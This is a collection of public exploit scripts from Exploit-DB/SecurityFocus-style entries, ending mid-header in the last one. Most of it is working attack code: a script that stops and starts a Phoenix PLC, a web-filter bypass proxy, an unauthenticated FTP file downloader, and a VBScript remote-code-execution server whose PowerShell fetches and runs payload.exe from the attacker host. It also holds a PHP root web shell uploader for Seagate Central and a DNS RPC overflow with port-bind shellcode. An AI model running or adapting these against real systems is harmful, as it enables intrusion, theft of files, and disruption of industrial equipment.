    send_and_recv(s,1000,'010000000000290000000000000000004164652e52656d6f74696e672e53657276696365732e49446576696365496e666f5365727669636500')
    send_and_recv(s,1000,'0100000000002a00000000000000d4ff4164652e52656d6f74696e672e53657276696365732e4944617461416363657373536572766963653300')
    send_and_recv(s,1000,'010000000000290000000000000000004164652e52656d6f74696e672e53657276696365732e49446174614163636573735365727669636500')
    send_and_recv(s,1000,'0100000000002a00000000000000d4ff4164652e52656d6f74696e672e53657276696365732e4944617461416363657373536572766963653200')
    send_and_recv(s,1000,'0100000000002900000000000000d5ff4164652e52656d6f74696e672e53657276696365732e49427265616b706f696e745365727669636500')
    send_and_recv(s,1000,'0100000000002800000000000000d6ff4164652e52656d6f74696e672e53657276696365732e4943616c6c737461636b5365727669636500')
    send_and_recv(s,1000,'010000000000250000000000000000004164652e52656d6f74696e672e53657276696365732e494465627567536572766963653200')
    send_and_recv(s,1000,'0100000000002f00000000000000cfff4164652e52656d6f74696e672e53657276696365732e4950726f436f6e4f53436f6e74726f6c536572766963653200')
    send_and_recv(s,1000,'0100000000002e0000000000000000004164652e52656d6f74696e672e53657276696365732e4950726f436f6e4f53436f6e74726f6c5365727669636500')
    send_and_recv(s,1000,'0100000000003000000000000000ceff4164652e52656d6f74696e672e53657276696365732e4953696d706c6546696c65416363657373536572766963653300')
    send_and_recv(s,1000,'010000000000300000000000000000004164652e52656d6f74696e672e53657276696365732e4953696d706c6546696c65416363657373536572766963653200')
    send_and_recv(s,1000,'0100020000000e0003000300000000000500000012401340130011401200')
    return

def is_ipv4(ip):
	match = re.match("^(\d{0,3})\.(\d{0,3})\.(\d{0,3})\.(\d{0,3})$", ip)
	if not match:
		return False
	quad = []
	for number in match.groups():
		quad.append(int(number))
	if quad[0] < 1:
		return False
	for number in quad:
		if number > 255 or number < 0:
			return False
	return True

##### The Actual Program
if not len(sys.argv) == 2:
        IP = raw_input("Please enter the IPv4 address of the Phoenix PLC: ")
else:
        IP = sys.argv[1]
        
if not is_ipv4(IP):
	print "Please go read RFC 791 and then use a legitimate IPv4 address."
	sys.exit()
	
## - initialization, this will get the PLC type, Firmware version, build date & time
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((IP,infoport))

print 'Initializing PLC'
print '----------------'
code = send_and_recv(s,1000,'0101001a005e000000000003000c494245544830314e305f4d00').encode('hex')[34:36]
send_and_recv(s,1000,'01050016005f000008ef00' + code + '00000022000402950000')
ret = send_and_recv(s,1000,'0106000e00610000881100' + code + '0400')
print 'PLC Type  = ' + ret[30:50]
print 'Firmware  = ' + ret[66:70]
print 'Build     = ' + ret[79:100]
send_and_recv(s,1000,'0105002e00630000000000' + code + '00000023001c02b0000c0000055b4433325d0b466c617368436865636b3101310000')
send_and_recv(s,1000,'0106000e0065ffffff0f00' + code + '0400')
send_and_recv(s,1000,'010500160067000008ef00' + code + '00000024000402950000')
send_and_recv(s,1000,'0106000e0069ffffff0f00' + code + '0400')
send_and_recv(s,1000,'0102000c006bffffff0f00' + code)

s.shutdown(socket.SHUT_RDWR)
s.close()
print 'Initialization done'
print '-------------------\r\n'
print 'Will now print the PLC state and reverse it after 3 seconds'
raw_input('Press [Enter] to continue')

########## CONTROL PHASE ####### Start monitoring with loop on port 41100
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((IP,controlport))
# First init phase (sending things like 'Ade.Remoting.Services.IProConOSControlService2' and 'Ade.Remoting.Services.ISimpleFileAccessService3', 21 packets)
initMonitor(s)
# Query packet
packet1 = '010002000000080003000300000000000200000002400b40'
# Keepalive packet
packet2 = '0100020000001c0003000300000000000c00000007000500060008001000020011000e000f000d0016401600'
## The loop keepalive and query status loop (2 x keepalive, one time query):
i = 0
state = 'On'
running = 0
stopme = 0
startme = 0
while True:
    i += 1
    time.sleep(0.1)
    ## Keep Alive
    send_and_recv(s,1000,packet2)
    send_and_recv(s,1000,packet2)

    ## Possible actions (like stop/start) should be sent now before the query state
    if (state == 'Running' and stopme):
        print 'Sending Stop'
        doAction(s,'01000200000000000100070000000000')
        startme = stopme = 0
    elif (state == 'Stop' and startme):
        print 'Sending COLD Start'
        ## This is the COLD start: doAction(s,'010002000000020001000600000000000100')
        ## This is the WARM start: doAction(s,'010002000000020001000600000000000200')
        ## This is the HOT  start: doAction(s,'010002000000020001000600000000000300')
        doAction(s,'010002000000020001000600000000000100')
        startme = stopme = 0    

    ## Query Status
    ret = send_and_recv(s,1000,packet1).encode('hex')
    if ret[48:50] == '03':
        state = 'Running'
    elif ret[48:50] == '07':
        state = 'Stop'
    elif ret[48:50] == '00':
        state = 'On'
    else:
        print 'State unknown, found code: '+ret.encode('hex')[48:50]
    print 'Current PLC state: '+state
    
    ## Maintaining the LOOP
    if i == 50:
        break
#   '''
    if i == 30:
        if state == 'Running':
            stopme = 1
        else:
            startme = 1
    #'''
raw_input('All done, press [Enter] to exit')
source: http://www.securityfocus.com/bid/53015/info

McAfee Web Gateway is prone to a security-bypass vulnerability because it fails to properly enforce filtering rules.

A successful attack will allow an attacker to bypass intended security restrictions; this may aid in other attacks.

McAfee Web Gateway 7 is vulnerable; other versions may also be affected.

import socket,struct,sys,time
from threading import Thread


#The timeOut can be changed if the proxy is slow.
#Tested in GMail, Facebook, Youtube and several blocked sites.
#The proxy get the Host field of the http header and do not verify anything else.
#It trusts on the HTTP Header and it can be modified by the attacker.

timeOut = 0.8
isGet = 0
hostNameG = ""
pacoteGet = ""
port = 8080 #Listening port
proxyAddr = "vulnerableProxy.com" #vulnerable proxy
proxyPort = 8080 # proxy port

def handle(client,globalSock):
	
	client.settimeout(timeOut)
	
	global hostNameG
	

	while 1:
		
		dados = ""
		tam = 0
		while 1:
                        try:
                                dados2 = client.recv(1024)
                                tam = tam + len(dados2)
                                dados = dados + dados2
                        except socket.timeout:
                               
                                break

		
		dd = dados.find("CONNECT") #if the packet is a CONNECT METHOD
		if dd != -1:
		  dd2 = dados.find(":")
		  hostName = dados[dd+8:dd2]
		  
		  ipAddr = socket.gethostbyname(hostName) #changing the method to connect to the ip address, not the dns domain
		  pacote = dados
		  hostHeader = "Host: " + hostName
		  pacote = pacote.replace(hostHeader, "Host: www.uol.com.br") #changing the host field with a value that is accepted by the proxy
		  pacote = pacote.replace(hostName, ipAddr) #changind domain for ip
		  
		  
		  
		  dados = pacote
		
		getd = dados.find("GET ")
		getd2 = dados.find("//")
		getd3 = dados.find("/", getd2+2)
		hostName = dados[getd2+2:getd3]
		
		
		if getd != -1:
		  globalSock.close()
		  globalSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		  globalSock.connect((proxyAddr,proxyPort))
		  globalSock.settimeout(timeOut)
		  getd2 = dados.find("//")
		  getd3 = dados.find("/", getd2+2)
		  
		  hostName = dados[getd2+2:getd3]
		  
		  proxyAuth = ""
		  proxyAuthN = dados.find("Proxy-Authorization:")
		  if proxyAuthN != -1:
		    proxyAuthNN = dados.find("\r\n", proxyAuthN)
		    proxyAuth = dados[proxyAuthN:proxyAuthNN]
		    
		    
		  ipAddr = socket.gethostbyname(hostName)
		  
		  info = "CONNECT " + ipAddr + ":80 HTTP/1.1\r\n"
		  if proxyAuthN != -1:
		    info += proxyAuth + "\r\n"
		  
		  info += "Host: www.uol.com.br\r\n\r\n"
		  
		  globalSock.send(info)
		  tam = 0
		  gdata = ""
		  
		  while 1:
			try:
				
				gdata2 = globalSock.recv(1024)
				
				tam = tam + len(gdata2)
				gdata = gdata + gdata2
				
				if len(gdata2) == 0: 
					break
				
				
			except socket.timeout:
				
				break
		  
		
		
		  
		
		globalSock.send(dados)
		tam = 0
		gdata = ""
		
		while 1:
			try:
				
				gdata2 = globalSock.recv(1024)
				
				if len(gdata2) > 0:
					client.send(gdata2)
				
				tam = tam + len(gdata2)
				gdata = gdata + gdata2
				
				if len(gdata2) == 0: 
					break
				
				
			except socket.timeout:
				
				break
		
		


print 'Proxy Bypass'
print 'by Gabriel Menezes Nunes'
print 'Tested on McAfee Web Gateway 7 and Squid Proxy'
sockzao = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print 'Attacked Proxy:',
print proxyAddr
print 'Listening on',
print port
sockzao.bind(("",port))

sockzao.listen(6)

while 1:
	print 'Waiting for connections'
	client, address = sockzao.accept()
	print 'Client Connected'
	print address
	globalSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	globalSock.connect((proxyAddr,proxyPort))
	globalSock.settimeout(timeOut)

	t = Thread(target=handle, args=(client,globalSock,))
	t.start()
#!/usr/bin/env python
#==================================================================================
# Exploit Title: FTP Media Server 3.0 - Authentication Bypass and Denial of Service
# Date: 2015-05-25
# Exploit Author: Wh1t3Rh1n0 (Michael Allen)
# Exploit Author's Homepage: http://www.mikeallen.org
# Software Link: https://itunes.apple.com/us/app/ftp-media-server-free/id528962302
# Version: 3.0
# Tested on: iPhone
#==================================================================================
# ------------------
# Denial of Service:
# ------------------
# The FTP server does not properly handle errors raised by invalid 
# FTP commands. The following command, which sends an invalid PORT command to 
# the FTP server, will crash the server once it is received.

# echo -en "PORT\r\n" | nc -nv 192.168.2.5 50000

# ----------------------
# Authentication Bypass:
# ----------------------
# The FTP server does not handle unauthenticated connections or incorrect login
# credentials properly. A remote user can issue commands to the FTP server 
# without authenticating or after entering incorrect credentials.

# The following proof-of-concept connects to the given FTP server and 
# downloads all files stored in the "Camera Roll" folder without providing a
# username or password:

import sys
from ftplib import FTP

if len(sys.argv) <= 1:
    print "Usage: ./ftp-nologin.py [host] [port]"
    exit()

host = sys.argv[1]    
port = int(sys.argv[2])

files = []

def append_file(s):
    files.append(s.split(' ')[-1])

blocks = []
def get_blocks(d):
    blocks.append(d)

ftp = FTP()
print ftp.connect(host, port)
ftp.set_pasv(1)
ftp.cwd("Camera Roll")
print ftp.retrlines('LIST', append_file)

files.pop(0)

for filename in files:
    print "Downloading %s..." % filename
    ftp.retrbinary('RETR /Camera Roll/' + filename, get_blocks)

    f = open(filename, 'wb')
    for block in blocks:
        f.write(block)
    f.close()
    print "[+] File saved to: %s" % filename
    
    blocks = []

ftp.quit()
#!/usr/bin/python

import BaseHTTPServer, socket

##
# IBM Security AppScan Standard OLE Automation Array Remote Code Execution
#
# Author: Naser Farhadi
# Linkedin: http://ir.linkedin.com/pub/naser-farhadi/85/b3b/909
#
# Date: 1 June 2015 # Version: <= 9.0.2 # Tested on: Windows 7
#
# Exploit Based on MS14-064 CVE-2014-6332 http://www.exploit-db.com/exploits/35229/ 
# if you able to exploit IE then you can exploit appscan and acunetix ;)
# This Python Script Will Start A Sample HTTP Server On Attacker Machine And Serves Exploit Code And
# Metasploit windows/shell_bind_tcp Executable Payload
#
# Usage:
#       chmod +x appscan.py
#       ./appscan.py
#       ...
#       nc 172.20.10.14 333
#
# Video: http://youtu.be/hPs1zQaBLMU
##

class RequestHandler(BaseHTTPServer.BaseHTTPRequestHandler):
    def do_GET(req):
        req.send_response(200)
        if req.path == "/payload.exe":
            req.send_header('Content-type', 'application/exe')
            req.end_headers()
            exe = open("payload.exe", 'rb')
            req.wfile.write(exe.read())
            exe.close()
        else:
            req.send_header('Content-type', 'text/html')
            req.end_headers()
            req.wfile.write("""Please scan me!
                            <SCRIPT LANGUAGE="VBScript">
                            function runmumaa() 
                            On Error Resume Next
                            set shell=createobject("Shell.Application")
                            command="Invoke-Expression $(New-Object System.Net.WebClient).DownloadFile('http://"""+socket.gethostbyname(socket.gethostname())+"""/payload.exe',\
                            'payload.exe');$(New-Object -com Shell.Application).ShellExecute('payload.exe');"
                            shell.ShellExecute "powershell", "-Command " & command, "", "runas", 0
                            end function

                            dim   aa()
                            dim   ab()
                            dim   a0
                            dim   a1
                            dim   a2
                            dim   a3
                            dim   win9x
                            dim   intVersion
                            dim   rnda
                            dim   funclass
                            dim   myarray

                            Begin()

                            function Begin()
                              On Error Resume Next
                              info=Navigator.UserAgent

                              if(instr(info,"Win64")>0)   then
                                 exit   function
                              end if

                              if (instr(info,"MSIE")>0)   then 
                                         intVersion = CInt(Mid(info, InStr(info, "MSIE") + 5, 2))   
                              else
                                 exit   function  
                                         
                              end if

                              win9x=0

                              BeginInit()
                              If Create()=True Then
                                 myarray=        chrw(01)&chrw(2176)&chrw(01)&chrw(00)&chrw(00)&chrw(00)&chrw(00)&chrw(00)
                                 myarray=myarray&chrw(00)&chrw(32767)&chrw(00)&chrw(0)

                                 if(intVersion<4) then
                                     document.write("<br> IE")
                                     document.write(intVersion)
                                     runshellcode()                    
                                 else  
                                      setnotsafemode()
                                 end if
                              end if
                            end function

                            function BeginInit()
                               Randomize()
                               redim aa(5)
                               redim ab(5)
                               a0=13+17*rnd(6)
                               a3=7+3*rnd(5)
                            end function

                            function Create()
                              On Error Resume Next
                              dim i
                              Create=False
                              For i = 0 To 400
                                If Over()=True Then
                                '   document.write(i)     
                                   Create=True
                                   Exit For
                                End If 
                              Next
                            end function

                            sub testaa()
                            end sub

                            function mydata()
                                On Error Resume Next
                                 i=testaa
                                 i=null
                                 redim  Preserve aa(a2)  
                              
                                 ab(0)=0
                                 aa(a1)=i
                                 ab(0)=6.36598737437801E-314

                                 aa(a1+2)=myarray
                                 ab(2)=1.74088534731324E-310  
                                 mydata=aa(a1)
                                 redim  Preserve aa(a0)  
                            end function 


                            function setnotsafemode()
                                On Error Resume Next
                                i=mydata()  
                                i=readmemo(i+8)
                                i=readmemo(i+16)
                                j=readmemo(i+&h134)  
                                for k=0 to &h60 step 4
                                    j=readmemo(i+&h120+k)
                                    if(j=14) then
                                          j=0          
                                          redim  Preserve aa(a2)             
                                 aa(a1+2)(i+&h11c+k)=ab(4)
                                          redim  Preserve aa(a0)  

                                 j=0 
                                          j=readmemo(i+&h120+k)   
                                     
                                           Exit for
                                       end if

                                next 
                                ab(2)=1.69759663316747E-313
                                runmumaa() 
                            end function

                            function Over()
                                On Error Resume Next
                                dim type1,type2,type3
                                Over=False
                                a0=a0+a3
                                a1=a0+2
                                a2=a0+&h8000000
                              
                                redim  Preserve aa(a0) 
                                redim   ab(a0)     
                              
                                redim  Preserve aa(a2)
                              
                                type1=1
                                ab(0)=1.123456789012345678901234567890
                                aa(a0)=10
                                      
                                If(IsObject(aa(a1-1)) = False) Then
                                   if(intVersion<4) then
                                       mem=cint(a0+1)*16             
                                       j=vartype(aa(a1-1))
                                       if((j=mem+4) or (j*8=mem+8)) then
                                          if(vartype(aa(a1-1))<>0)  Then    
                                             If(IsObject(aa(a1)) = False ) Then             
                                               type1=VarType(aa(a1))
                                             end if               
                                          end if
                                       else
                                         redim  Preserve aa(a0)
                                         exit  function

                                       end if 
                                    else
                                       if(vartype(aa(a1-1))<>0)  Then    
                                          If(IsObject(aa(a1)) = False ) Then
                                              type1=VarType(aa(a1))
                                          end if               
                                        end if
                                    end if
                                end if
                                          
                                
                                If(type1=&h2f66) Then         
                                      Over=True      
                                End If  
                                If(type1=&hB9AD) Then
                                      Over=True
                                      win9x=1
                                End If  

                                redim  Preserve aa(a0)          
                                    
                            end function

                            function ReadMemo(add) 
                                On Error Resume Next
                                redim  Preserve aa(a2)  
                              
                                ab(0)=0   
                                aa(a1)=add+4     
                                ab(0)=1.69759663316747E-313       
                                ReadMemo=lenb(aa(a1))  
                               
                                ab(0)=0    
                             
                                redim  Preserve aa(a0)
                            end function

                            </script>""")

if __name__ == '__main__':
    sclass = BaseHTTPServer.HTTPServer
    server = sclass((socket.gethostbyname(socket.gethostname()), 80), RequestHandler)
    print "Http server started", socket.gethostbyname(socket.gethostname()), 80
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        pass
    server.server_close()#!/usr/bin/python
#Exploit Title:WebDrive Buffer OverFlow PoC
#Author: metacom
#Vendor Homepage: http://www.webdrive.com/products/webdrive/
#Software Link: https://www.webdrive.com/products/webdrive/download/
#Version: 12.2 (build # 4172) 32 bit
#Date found:     31.05.2015
#Date published: 31.05.2015
#Platform: Windows 7 Ultimate
#Bug: Multiple Buffer Overflow UNICODE
'''
----------------------------------------------------------------------------
Summary:
Unlike a typical FTP client, WebDrive allows you to open and 
edit server-based, files without the additional step of downloading the file. 
Using a simple wizard, you assign a network drive letter to the FTP Server. 
WebDrive supports additional protocols such as WebDAV, SFTP and Amazon S3 and 
maps a drive letter to each of these servers.You can map unique drive letters
to multiple servers.Download the full-function 20-day trial of WebDrive and 
make file management on remote servers easier and more efficient!
------------------------------------------------------------------------------
WebDrive connects to many types of web servers, 
as well as servers in the cloud.You can use WebDrive 
to access your files on all of the following server 
types and protocols:

WebDAV ------------>Vulnerable
WebDAV over SSL---->Vulnerable
FTP---------------->Vulnerable
FTP over SSL------->Vulnerable
Amazon S3---------->Vulnerable
SFTP--------------->Vulnerable
FrontPage Server--->Vulnerable

------------------------------------------------------------------------------
How to Crash:

Copy the AAAA...string from WebDrive.txt to clipboard, create a connection 
and paste it in the URL/Address and attempt to connect.


WebDAV
============================
Crash Analysis using WinDBG:
============================
(430.9f8): Access violation - code c0000005 (!!! second chance !!!)
eax=001cad5c ebx=02283af8 ecx=00000041 edx=02289d9c esi=fdf47264 edi=001cad5c
eip=0055ff2b esp=001c8cfc ebp=001c8d00 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
*** ERROR: Module load completed but symbols could not be loaded for C:\Program Files\WebDrive\webdrive.exe
webdrive+0x30ff2b:
0055ff2b 66890c16        mov     word ptr [esi+edx],cx    ds:0023:001d1000=????
0:000> !exchain
001c8d20: webdrive+35a24e (005aa24e)
001cb768: webdrive+1c0041 (00410041)
Invalid exception stack at 00410041
0:000> d 001cb768
001cb768  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
001cb778  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
001cb788  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
001cb798  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
001cb7a8  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
001cb7b8  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
001cb7c8  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
001cb7d8  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.

WebDAV over SSL
============================
Crash Analysis using WinDBG:
============================
(b88.ca0): Access violation - code c0000005 (!!! second chance !!!)
eax=00000000 ebx=00000000 ecx=00410041 edx=775e660d esi=00000000 edi=00000000
eip=00410041 esp=000a1238 ebp=000a1258 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Windows\system32\ipworks9.dll - 
ipworks9!IPWorks_SNPP_Get+0x57f:
00410041 038d4df0e8da    add     ecx,dword ptr [ebp-25170FB3h] ss:0023:daf302a5=????????
0:000>!exchain
Invalid exception stack at 00410041

FTP and FTP over SSL
============================
Crash Analysis using WinDBG:
============================
(834.70c): Access violation - code c0000005 (!!! second chance !!!)
eax=00000000 ebx=00410041 ecx=00000400 edx=00000000 esi=002d84f0 edi=00000000
eip=775e64f4 esp=002d8488 ebp=002d84dc iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
ntdll!KiFastSystemCallRet:
775e64f4 c3              ret
0:000> !exchain
002d8c1c: webdrive+35a24e (015da24e)
002db664: 00410041
Invalid exception stack at 00410041

Amazon S3
============================
Crash Analysis using WinDBG:
============================
(a64.a98): Access violation - code c0000005 (!!! second chance !!!)
eax=00000000 ebx=00410041 ecx=00000400 edx=00000000 esi=002f8550 edi=00000000
eip=775e64f4 esp=002f84e8 ebp=002f853c iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
ntdll!KiFastSystemCallRet:
775e64f4 c3              ret
0:000> !exchain
002f8c7c: webdrive+35a24e (015da24e)
002fb6c4: 00410041
Invalid exception stack at 00410041

SFTP
============================
Crash Analysis using WinDBG:
============================
(848.9a8): Access violation - code c0000005 (!!! second chance !!!)
eax=00000000 ebx=00410041 ecx=00000400 edx=00000000 esi=002380f8 edi=00000000
eip=775e64f4 esp=00238090 ebp=002380e4 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
ntdll!KiFastSystemCallRet:
775e64f4 c3              ret
0:000> !exchain
00238824: webdrive+35a24e (015da24e)
0023b26c: 00410041
Invalid exception stack at 00410041

FrontPage Server
============================
Crash Analysis using WinDBG:
============================
(cd4.710): Access violation - code c0000005 (!!! second chance !!!)
eax=007ba9f0 ebx=05d29738 ecx=00000041 edx=05d2fd48 esi=faa912b8 edi=007ba9f0
eip=003bff2b esp=007b8990 ebp=007b8994 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
*** ERROR: Module load completed but symbols could not be loaded for C:\Program Files\WebDrive\webdrive.exe
webdrive+0x30ff2b:
003bff2b 66890c16        mov     word ptr [esi+edx],cx    ds:0023:007c1000=????
0:000> !exchain
007b89b4: webdrive+35a24e (0040a24e)
007bb3fc: webdrive+360041 (00410041)
Invalid exception stack at 00410041

'''

#Proof of Concept:

buffer="http://"
buffer+="\x41" * 70000
off=buffer

try:
	out_file = open("WebDrive.txt",'w')
	out_file.write(off)
	out_file.close()
	print("[*] Malicious txt file created successfully")
except:
	print "[!] Error creating file"

#!/usr/bin/python
# seagate_ftp_remote_root.py
#
# Seagate Central Remote Root Exploit
#
# Jeremy Brown [jbrown3264/gmail]
# May 2015
#
# -Synopsis-
#
# Seagate Central by default has a passwordless root account (and no option to change it).
# One way to exploit this is to log into it's ftp server and upload a php shell to the webroot.
# From there, we can execute commands with root privileges as lighttpd is also running as root.
#
# -Fixes-
#
# Seagate scheduled it's updates to go live on April 28th, 2015.
#
# Tested Firmware Version: 2014.0410.0026-F
#

import sys
from ftplib import FTP

port = 21

php_shell = """
<?php
if(isset($_REQUEST['cmd']))
{
    $cmd = ($_REQUEST["cmd"]);
    echo "<pre>$cmd</pre>";
    system($cmd);
}
?>
"""

php_shell_filename = "shell.php"
seagate_central_webroot = "/cirrus/"

def main():
    if(len(sys.argv) < 2):
        print("Usage: %s <host>" % sys.argv[0])
        return

    host = sys.argv[1]

    try:
        with open(php_shell_filename, 'w') as file:
            file.write(php_shell)

    except Exception as error:
        print("Error: %s" % error);
        return

    try:
        ftp = FTP(host)
        ftp.login("root")
        ftp.storbinary("STOR " + seagate_central_webroot + php_shell_filename, open(php_shell_filename, 'rb'))
        ftp.close()
    
    except Exception as error:
        print("Error: %s" % error);
        return

    print("Now surf on over to http://%s%s%s for the php root shell" % (host, seagate_central_webroot, php_shell_filename))

    return

if __name__ == "__main__":
    main()
#!/usr/bin/python
# Remote exploit for the 0day Windows DNS RPC service vulnerability as
# described in http://www.securityfocus.com/bid/23470/info. Tested on
# Windows 2000 SP4. The exploit if successful binds a shell to TCP port 4444
# and then connects to it.
#
# Cheers to metasploit for the first exploit.
# Written for educational and testing purposes.
# Author shall bear no responsibility for any damage caused by using this code
# Winny Thomas :-)

import os
import sys
import time
from impacket.dcerpc import transport, dcerpc, epm
from impacket import uuid

#Portbind shellcode from metasploit; Binds port to TCP port 4444
shellcode  = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
shellcode += "\x29\xc9\x83\xe9\xb0\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e\xe9"
shellcode += "\x4a\xb6\xa9\x83\xee\xfc\xe2\xf4\x15\x20\x5d\xe4\x01\xb3\x49\x56"
shellcode += "\x16\x2a\x3d\xc5\xcd\x6e\x3d\xec\xd5\xc1\xca\xac\x91\x4b\x59\x22"
shellcode += "\xa6\x52\x3d\xf6\xc9\x4b\x5d\xe0\x62\x7e\x3d\xa8\x07\x7b\x76\x30"
shellcode += "\x45\xce\x76\xdd\xee\x8b\x7c\xa4\xe8\x88\x5d\x5d\xd2\x1e\x92\x81"
shellcode += "\x9c\xaf\x3d\xf6\xcd\x4b\x5d\xcf\x62\x46\xfd\x22\xb6\x56\xb7\x42"
shellcode += "\xea\x66\x3d\x20\x85\x6e\xaa\xc8\x2a\x7b\x6d\xcd\x62\x09\x86\x22"
shellcode += "\xa9\x46\x3d\xd9\xf5\xe7\x3d\xe9\xe1\x14\xde\x27\xa7\x44\x5a\xf9"
shellcode += "\x16\x9c\xd0\xfa\x8f\x22\x85\x9b\x81\x3d\xc5\x9b\xb6\x1e\x49\x79"
shellcode += "\x81\x81\x5b\x55\xd2\x1a\x49\x7f\xb6\xc3\x53\xcf\x68\xa7\xbe\xab"
shellcode += "\xbc\x20\xb4\x56\x39\x22\x6f\xa0\x1c\xe7\xe1\x56\x3f\x19\xe5\xfa"
shellcode += "\xba\x19\xf5\xfa\xaa\x19\x49\x79\x8f\x22\xa7\xf5\x8f\x19\x3f\x48"
shellcode += "\x7c\x22\x12\xb3\x99\x8d\xe1\x56\x3f\x20\xa6\xf8\xbc\xb5\x66\xc1"
shellcode += "\x4d\xe7\x98\x40\xbe\xb5\x60\xfa\xbc\xb5\x66\xc1\x0c\x03\x30\xe0"
shellcode += "\xbe\xb5\x60\xf9\xbd\x1e\xe3\x56\x39\xd9\xde\x4e\x90\x8c\xcf\xfe"
shellcode += "\x16\x9c\xe3\x56\x39\x2c\xdc\xcd\x8f\x22\xd5\xc4\x60\xaf\xdc\xf9"
shellcode += "\xb0\x63\x7a\x20\x0e\x20\xf2\x20\x0b\x7b\x76\x5a\x43\xb4\xf4\x84"
shellcode += "\x17\x08\x9a\x3a\x64\x30\x8e\x02\x42\xe1\xde\xdb\x17\xf9\xa0\x56"
shellcode += "\x9c\x0e\x49\x7f\xb2\x1d\xe4\xf8\xb8\x1b\xdc\xa8\xb8\x1b\xe3\xf8"
shellcode += "\x16\x9a\xde\x04\x30\x4f\x78\xfa\x16\x9c\xdc\x56\x16\x7d\x49\x79"
shellcode += "\x62\x1d\x4a\x2a\x2d\x2e\x49\x7f\xbb\xb5\x66\xc1\x19\xc0\xb2\xf6"
shellcode += "\xba\xb5\x60\x56\x39\x4a\xb6\xa9"

# Stub sections taken from metasploit 
stub  = '\xd2\x5f\xab\xdb\x04\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00'
stub += '\x70\x00\x00\x00\x00\x00\x00\x00\x1f\x38\x8a\x9f\x12\x05\x00\x00'
stub += '\x00\x00\x00\x00\x12\x05\x00\x00'
stub += '\\A' * 465
# At the time of overflow ESP points into our buffer which has each char 
# prepended by a '\' and our shellcode code is about 24+ bytes away from 
# where EDX points
stub += '\\\x80\\\x62\\\xE1\\\x77'#Address of jmp esp from user32.dll
# The following B's which in assembly translates to 'inc EDX' increments
# about 31 times EDX so that it points into our shellcode 
stub += '\\B' * 43 
# Translates to 'jmp EDX'
stub += '\\\xff\\\xe2'
stub += '\\A' * 134 
stub += '\x00\x00\x00\x00\x76\xcf\x80\xfd\x03\x00\x00\x00\x00\x00\x00\x00'
stub += '\x03\x00\x00\x00\x47\x00\x00\x00'
stub += shellcode

# Code ripped from core security document on impacket
# www.coresecurity.com/files/attachments/impacketv0.9.6.0.pdf 
# Not a neat way to discover a dynamic port :-)
def DiscoverDNSport(target):
	trans = transport.SMBTransport(target, 139, 'epmapper')
	trans.connect()
	dce = dcerpc.DCERPC_v5(trans)
	dce.bind(uuid.uuidtup_to_bin(('E1AF8308-5D1F-11C9-91A4-08002B14A0FA','3.0')))
	pm = epm.DCERPCEpm(dce)
	handle = '\x00'*20
	while 1:
		dump = pm.portmap_dump(handle)
		if not dump.get_entries_num():
			break
		handle = dump.get_handle()
		entry = dump.get_entry().get_entry()
		if(uuid.bin_to_string(entry.get_uuid()) == '50ABC2A4-574D-40B3-9D66-EE4FD5FBA076'):
			port = entry.get_string_binding().split('[')[1][:-1]
			return int(port)

	print '[-] Could not locate DNS port; Target might not be running DNS'

def ExploitDNS(target, port):
	trans = transport.TCPTransport(target, port)
	trans.connect()
	dce = dcerpc.DCERPC_v5(trans)
	dce.bind(uuid.uuidtup_to_bin(('50abc2a4-574d-40b3-9d66-ee4fd5fba076','5.0')))	
	
	dce.call(0x01, stub)

def ConnectRemoteShell(target):
	connect = "/usr/bin/telnet " + target + " 4444"
	os.system(connect)

if __name__ == '__main__':
	try:
		target = sys.argv[1]
	except IndexError:
		print 'Usage: %s <target ip address>' % sys.argv[0]
		sys.exit(-1)

	print '[+] Locating DNS RPC port'
	port = DiscoverDNSport(target)
	print '[+] Located DNS RPC service on TCP port: %d' % port
	ExploitDNS(target, port)
	print '[+] Exploit sent. Connecting to shell in 3 seconds'
	time.sleep(3)
	ConnectRemoteShell(target)	

# milw0rm.com [2007-04-15]
source: http://www.securityfocus.com/bid/54006/info

Edimax IC-3030iWn is prone to an information-disclosure vulnerability.

Successful exploits will allow a remote attacker to gain access to sensitive information. Information obtained will aid in further attacks. 

#!/usr/bin/env python
"""
# Exploit Title: Edimax IC-3030iWn Web Admin Auth Bypass exploit
# Date: 4 April 2012
# Exploit Author: y3dips@echo.or.id, @y3dips
# URL: http://echo.or.id
# Vendor Homepage: http://www.edimax.com
# Sourcecode Link: http://www.edimax.com/en/produce_detail.php?pd_id=352&pl1_id=8&pl2_id=91
# Also Tested on:
   - Edimax IC-3015
   - Airlive WN 500
